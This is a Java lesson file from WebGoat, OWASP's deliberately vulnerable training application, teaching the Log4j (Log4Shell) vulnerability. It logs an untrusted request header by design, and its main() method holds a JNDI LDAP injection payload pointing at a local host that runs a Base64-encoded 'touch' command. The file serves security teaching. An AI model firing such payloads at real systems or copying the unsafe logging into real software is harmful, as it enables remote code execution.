/*
 * This file is part of WebGoat, an Open Web Application Security Project utility. For details, please see http://www.owasp.org/
 *
 * Copyright (c) 2002 - 2019 Bruce Mayhew
 *
 * This program is free software; you can redistribute it and/or modify it under the terms of the
 * GNU General Public License as published by the Free Software Foundation; either version 2 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without
 * even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along with this program; if
 * not, write to the Free Software Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA
 * 02111-1307, USA.
 *
 * Getting Source ==============
 *
 * Source for this application is maintained at https://github.com/WebGoat/WebGoat, a repository for free software projects.
 */

package org.owasp.webgoat.lessons.osslog4j;

import org.owasp.webgoat.container.assignments.AssignmentEndpoint;
import org.owasp.webgoat.container.assignments.AssignmentHints;
import org.owasp.webgoat.container.assignments.AttackResult;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestHeader;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
@AssignmentHints({"vulnerable-log4j.hint"})
public class VulnerableLog4jComponentsLesson extends AssignmentEndpoint {

  Logger log = LoggerFactory.getLogger(VulnerableLog4jComponentsLesson.class.getName());

  // This is test code by surya
  @PostMapping("/VulnerableLog4jComponentsLesson/index")
  public @ResponseBody AttackResult index(@RequestHeader("X-Api-Version") String apiversion) {

    try {
      log.info("Received a request for API version: {}", apiversion);
      System.out.println(" Received a request for API version " + apiversion);

    } catch (IllegalArgumentException ex) {
      return success(this)
          .feedback("vulnerable-log4j-components.success")
          .output(ex.getMessage())
          .build();
    } catch (Exception ex) {
      return failed(this)
          .feedback("vulnerable-log4j-components.close")
          .output(ex.getMessage())
          .build();
    }

    return failed(this)
        .feedback("vulnerable-log4j-components.fromXML")
        .feedbackArgs(apiversion)
        .build();
  }

  public static void main(String[] args) {

    Logger log = LoggerFactory.getLogger(VulnerableLog4jComponentsLesson.class.getName());
    String apiversion =
        "${jndi:ldap://127.0.0.1:9000/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}";

    log.info("Received a request for API version: {}", apiversion);
    System.out.println(" Received a request for API version " + apiversion);
    System.out.println(" log object --> " + log.getClass().getCanonicalName());
  }
}
